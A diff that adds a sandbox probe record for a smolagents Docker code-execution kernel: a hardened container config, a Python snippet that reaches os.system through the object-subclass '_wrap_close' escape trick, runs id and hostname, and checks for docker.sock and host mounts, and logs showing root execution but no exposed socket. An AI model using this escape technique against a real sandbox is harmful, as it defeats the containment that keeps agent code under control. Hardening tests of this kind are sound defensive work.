@@ -1,0 +1,29 @@
+config: {"port": 41940, "image_name": "smolagents-docker-jupyter-kernel", "container_run_kwargs": {"name": "smolagents-docker-h-p12", "mem_limit": "512m", "cpu_quota": 50000, "pids_limit": 100, "security_opt": ["no-new-privileges"], "cap_drop": ["ALL"]}}
+code:
+subs = ().__class__.__base__.__subclasses__()
+wc = [c for c in subs if c.__name__ == '_wrap_close']
+print(len(subs), len(wc))
+print(__import__('os').system('echo PWNED; hostname'))
+print(wc[0].__init__.__globals__['system']('echo PWNED2'))
+import subprocess
+print(subprocess.run(['id'], capture_output=True, text=True).stdout)
+import os
+print('docker.sock', os.path.exists('/var/run/docker.sock'), 'Users', os.path.exists('/Users'))
+
+{
+  "probe": "P12",
+  "hardened": true,
+  "harness_wall_s": 4.0,
+  "peak_container_mem_mib": 0,
+  "raw": {
+    "setup_ms": 3128,
+    "result": {
+      "ok": true,
+      "output": "None",
+      "logs": "789 1\nPWNED\n1aa852aeb401\n0\nPWNED2\n0\nuid=0(root) gid=0(root) groups=0(root)\n\ndocker.sock False Users False\n",
+      "ms": 51.1
+    },
+    "wall_s": 3.63
+  },
+  "child_tail": ""
+}
